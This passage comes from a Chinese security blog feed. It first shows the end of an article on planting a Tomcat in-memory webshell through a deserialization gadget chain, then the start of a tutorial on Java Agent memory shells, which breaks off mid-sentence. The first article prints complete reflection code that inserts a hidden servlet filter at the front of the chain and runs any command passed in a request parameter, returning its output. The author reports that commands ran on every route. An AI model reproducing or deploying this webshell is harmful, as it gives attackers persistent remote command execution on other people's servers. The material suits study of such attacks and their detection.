<span class="variable">ctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                ctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) ctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">                <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(appctx);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (standardContext != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="comment">// 这样设置不会抛出报错</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">stateField</span> <span class="operator">=</span> org.apache.catalina.util.LifecycleBase.class</span><br><span class="line">                            .getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">                    stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    stateField.set(standardContext, LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line">                    <span class="type">Filter</span> <span class="variable">myFilter</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TomcatInject</span>();</span><br><span class="line">                    <span class="comment">// 调用 doFilter 来动态添加我们的 Filter</span></span><br><span class="line">                    <span class="comment">// 这里也可以利用反射来添加我们的 Filter</span></span><br><span class="line">                    javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span></span><br><span class="line">                            servletContext.addFilter(filterName,myFilter);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 进行一些简单的设置</span></span><br><span class="line">                    filterRegistration.setInitParameter(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                    filterRegistration.setAsyncSupported(<span class="literal">false</span>);</span><br><span class="line">                    <span class="comment">// 设置基本的 url pattern</span></span><br><span class="line">                    filterRegistration</span><br><span class="line">                            .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 将服务重新修改回来，不然的话服务会无法正常进行</span></span><br><span class="line">                    <span class="keyword">if</span> (stateField != <span class="literal">null</span>)&#123;</span><br><span class="line">                        stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 在设置之后我们需要 调用 filterstart</span></span><br><span class="line">                    <span class="keyword">if</span> (standardContext != <span class="literal">null</span>)&#123;</span><br><span class="line">                        <span class="comment">// 设置filter之后调用 filterstart 来启动我们的 filter</span></span><br><span class="line">                        <span class="type">Method</span> <span class="variable">filterStartMethod</span> <span class="operator">=</span> StandardContext.class.getDeclaredMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">                        filterStartMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        filterStartMethod.invoke(standardContext,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/**</span></span><br><span class="line"><span class="comment">                         * 将我们的 filtermap 插入到最前面</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line"></span><br><span class="line">                        <span class="type">Class</span> <span class="variable">ccc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ccc = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">                        <span class="keyword">if</span> (ccc == <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                ccc = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//把filter插到第一位</span></span><br><span class="line">                        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>)</span><br><span class="line">                                .getDeclaredMethod(<span class="string">&quot;findFilterMaps&quot;</span>);</span><br><span class="line">                        Object[] filterMaps = (Object[]) m.invoke(standardContext);</span><br><span class="line">                        Object[] tmpFilterMaps = <span class="keyword">new</span> <span class="title class_">Object</span>[filterMaps.length];</span><br><span class="line">                        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> filterMaps[i];</span><br><span class="line">                            m = ccc.getMethod(<span class="string">&quot;getFilterName&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) m.invoke(o);</span><br><span class="line">                            <span class="keyword">if</span> (name.equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                                tmpFilterMaps[<span class="number">0</span>] = o;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                tmpFilterMaps[index++] = filterMaps[i];</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            filterMaps[i] = tmpFilterMaps[i];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ServletContext <span class="title function_">getServletContext</span><span class="params">()</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">/*shell注入，前提需要能拿到request、response等*/</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) f.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//不为空则意味着第一次反序列化的准备工作已成功</span></span><br><span class="line">        <span class="keyword">if</span> (threadLocal != <span class="literal">null</span> &amp;&amp; threadLocal.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">            servletRequest = (ServletRequest) threadLocal.get();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果不能去到request，则换一种方式尝试获取</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//spring获取法1</span></span><br><span class="line">        <span class="keyword">if</span> (servletRequest == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                c = Class.forName(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">                <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">                c = Class.forName(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">                m = c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">                servletRequest = (ServletRequest) m.invoke(o);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servletRequest != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> servletRequest.getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//spring获取法2</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            c = Class.forName(<span class="string">&quot;org.springframework.web.context.ContextLoader&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getCurrentWebApplicationContext&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">            c = Class.forName(<span class="string">&quot;org.springframework.web.context.WebApplicationContext&quot;</span>);</span><br><span class="line">            m = c.getMethod(<span class="string">&quot;getServletContext&quot;</span>);</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> (ServletContext) m.invoke(o);</span><br><span class="line">            <span class="keyword">return</span> servletContext;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span><br><span class="line">            <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse,</span></span><br><span class="line"><span class="params">                         FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(</span><br><span class="line">                <span class="string">&quot;TomcatShellInject doFilter.....................................................................&quot;</span>);</span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.<span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            servletResponse.getOutputStream().flush();</span><br><span class="line">            servletResponse.getOutputStream().close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动springboot，用CC11的链将恶意类打进去</p><p>日志打印出信息，内存马注入成功</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/15.png" class><p>能够任意路由执行命令</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/16.png" class><p>参考文章：</p><p><a href="http://wjlshare.com/archives/1541">http://wjlshare.com/archives/1541</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存马 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识Java Agent内存马</title>
      <link href="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<p>这个Agent内存马和之前分析的不太一样，毕竟涉及到java Agent这种我之前没有接触过的新技术，所以刚开始学起来可能会有些摸不着头脑。在此写一篇文章记录我初学java Agent内存马的一些认识和理解。</p><h2 id="0x01-认识Java-Agent"><a href="#0x01-认识Java-Agent" class="headerlink" title="0x01 认识Java Agent"></a>0x01 认识Java Agent</h2><p>在 jdk 1.5 之后引入了  java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，通过 java.lang.instrument 实现的工具我们称之为 Java Agent ，Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法</p><p>一般情况下，我们要修改java文件的内容就必须重新编译，而java agent技术可以在字节码层面上修改类，方法等，也有点像代码注入的方式。而本文要说的Agent内存马就利用动态修改字节码来将特定类的特定方法添加恶意代码。</p><p>java agent也只是一个java类，只不过它和普通java类不一样，它是以 premain 和 agentmain 方法作为入口，而不是main 方法。</p><blockquote><ul><li>实现<code>premain</code>方法，在JVM启动前加载。</li><li>实现<code>agentmain</code>方法，在JVM启动后加载。</li></ul></blockquote><p>接下来就从这两个方面认识java agent</p><h3 id="启动前加载"><a href="#启动前加载" class="headerlink" title="启动前加载"></a>启动前加载</h3><p>那么首先就是要创建一个java agent类了，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.AgentForward;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;===premain 方法被执行====&quot;</span>);</span><br><span class="line">        Class[] allLoadedClass = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class allLoadClass : allLoadedClass) &#123;</span><br><span class="line">            System.out.println(allLoadClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;===premain 方法被执行====&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>premain 方法有两个参数，agentArgs 就是普通的字符串参数，第二个参数是 Instrumentation 的一个对象，方法内的代码就是遍历并输出当前 JVM 中已加载的所有类的名称。</p><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p><code>java.lang.instrument.Instrumentation</code> 是 Java 标准库中的一个接口，它允许开发者在运行时进行类加载和字节码转换等操作。这个接口通常在 Java Agent 中使用，用于在应用程序运行期间修改或监视类的行为。Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果</p><p>它是一个接口，定义了一些方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 增加一个 Class 文件的转换器</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"><span class="comment">// 删除一个类转换器</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"><span class="comment">// 在类加载之后，重新定义 Class。</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"><span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>主要来说一下addTransformer方法，添加一个类转换器，那么什么是转换器？继承了ClassFileTransformer的类，它的实现类必须要重写 transform 方法，每当类加载的时候，我们自己定义的Transformer 的 transform 就会自动拦截，在这个方法里我们可以对其拦截下来的字节码动态修改。</p><p>自己定义一个类转换器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.AgentForward;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;transform被执行&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了方便演示直接在方法里写个输出。</p><h4 id="编辑manifest-mf文件"><a href="#编辑manifest-mf文件" class="headerlink" title="编辑manifest.mf文件"></a>编辑manifest.mf文件</h4><p>代码写完后还需要编写这个文件，类似于配置文件这种</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: com.AgentForward.Agent</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一行指定了文件的版本，Can-Redefine-Classes 这个属性指定了 Java Agent 是否允许重新定义类</p><p>Can-Retransform-Classes 这个属性指定了 Java Agent 是否允许重新转换类，这两个属性一定要配置，不然会出错</p><p>Premain-Class 这个属性指定了 Java Agent 的预加载类了，注意最后要添加一个换行。</p><p>最后把这个项目编译成jar文件，具体怎么编译自行百度。</p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>重新创建一个java项目用作测试，修改配置，在VM选项中添加配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-javaagent:out\production\java-agent.jar</span><br></pre></td></tr></table></figure><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/1.png" class><p>注意路径一定要写对</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/2.png" class><p>启动springboot</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/3.png" class><p>在启动之前会先执行premain方法，然后打印输出启动前加载的类，太多了</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/4.png" class><p>类加载的时候也会被transform方法拦截</p><h3 id="启动后加载"><a href="#启动后加载" class="headerlink" title="启动后加载"></a>启动后加载</h3><p>在现实场景中注入内存马肯定不会在程序启动前加载，而是在运行过程中修改字节码。</p><p>这里就需要用到 agentmain 入口方法，编写一个Agent</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.AgentBackwards;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;agent 方法被调用&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是输出一条日志，在 Java JDK6 以后实现启动后加载 Instrument 的是 Attach api。存在于 com.sun.tools.attach 里面有两个重要的类。其中一个就是 VirtualMachine 类</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/5.png" class><h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p>它是 Java Attach API 的核心部分之一，用于在运行时连接和管理 Java 虚拟机（JVM）进程。Attach API 允许外部工具（如 Java Agent）与正在运行的 JVM 进程进行交互，进行类加载、字节码转换、性能分析等操作。</p><p>注意：Windows系统中，安装的jdk中无法找到这个类，所以需要手动将你jdk安装目录下：lib目录中的tools.jar添加进当前工程的Libraries中</p><p>这个类里面定义了几种方法，例如LoadAgent，Attach 和 Detach。</p><p>Attach 方法：接收一个运行中的JVM的进程号，远程连接到JVM上，例如</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br></pre></td></tr></table></figure><p>LoadAgent 方法：允许向正在运行的JVM中注册一个Agent，进行类加载和字节码操作，这个方法接收Java Agent的位置路径。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vm.loadAgent(&quot;Agent的路径&quot;);</span><br></pre></td></tr></table></figure><p>Detach 方法：从运行的JVM上解除一个Agent</p><h4 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h4><p>仍然是编写manifest.mf文件，道理都是一样的，编译成一个Agent的jar</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Agent-Class: com.AgentBackwards.Agent</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>启动springboot项目，命令行输入命令：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Jps <span class="literal">-l</span></span><br></pre></td></tr></table></figure><p>可以看到JVM启动的进程号，注意启动的时候要将配置里面的VM选项删掉</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/6.png" class><p>当然springboot启动的时候没有任何日志输出</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/7.png" class><p>编写一个java类来远程连接JVM</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AgentInitializationException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AgentLoadException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AttachNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentCommand</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="type">VirtualMachine</span> <span class="variable">target</span> <span class="operator">=</span> VirtualMachine.attach(<span class="string">&quot;172432&quot;</span>);</span><br><span class="line">        target.loadAgent(<span class="string">&quot;D:\\javaweb\\java安全\\java-agentShell\\javaAgentTest\\out\\production\\java-agent.jar&quot;</span>);</span><br><span class="line">        target.detach();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行代码，将编译好的Agent注入到正在运行的JVM中</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/8.png" class><p>日志打印出来了，说明运行过程中执行了agentmain 入口方法，当然我们重写的 transform 方法也会被执行，这里可以作为实现Agent内存马注入的地方。</p><h2 id="0x02-Agent内存马分析"><a href="#0x02-Agent内存马分析" class="headerlink" title="0x02 Agent内存马分析"></a>0x02 Agent内存马分析</h2><h3 id="寻找关键方法修改"><a href="#寻找关键方法修改" class="headerlink" title="寻找关键方法修改"></a>寻找关键方法修改</h3><p>通过上文对Java agent的了解，我们需要将特定类的特定方法中添加恶意代码，那么寻找这个关键的类就是我们面临的第一个问题。</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/9.png" class><p>在我们访问资源的时候会调用过滤器链中的过滤器，当用户的请求到达Servlet之前，一定会首先经过过滤器。它们都是在ApplicationFilterChain类里，它的dofilter方法</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/10.png" class><p>封装了我们用户请求的 request 和 response，用此方法作为内存马的入口，可以完全控制请求和响应</p><h3 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h3><p>动态修改字节码肯定需要了解java的字节码编程。Javassist 提供了一个简单而强大的 API，使开发者能够直接在 Java 代码中进行字节码操作。使用 Javassist，你可以创建新的类、修改已有类的字段和方法、添加新的方法、修改方法体内的代码等，这里只简单说说对方法的修改。</p><h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h4><p>它是 Javassist 库中的一个核心类，它用于管理和操作类的字节码。简单来说，ClassPool就是一个容器，用于存放CtClass 对象的容器，通过代码获取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassPool cp = ClassPool.getDefault();</span><br></pre></td></tr></table></figure><h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><p>在Javassist中每个需要编辑的class都对应一个CtCLass实例，CtCLass就是编译时的类，这些类会存储在Class Pool中，CtClass中的CtField和CtMethod分别对应Java中的字段和方法。通过CtClass对象即可对类新增字段和修改方法等操作</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/11.png" class><h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>举一个修改方法的小例子就能体会到，给方法内部添加代码通常会使用 setBody 方法，然而添加代码之外还有向前插入和向后插入，方法分别为insertBefore和insertAfter</p><p>由于我们是需要修改已有方法的代码，为了不破坏程序原本的功能，不再使用setBody 方法，采用insertBefore 方法做一个简单的例子</p><p>编写一个测试类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javassist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后用 javassist 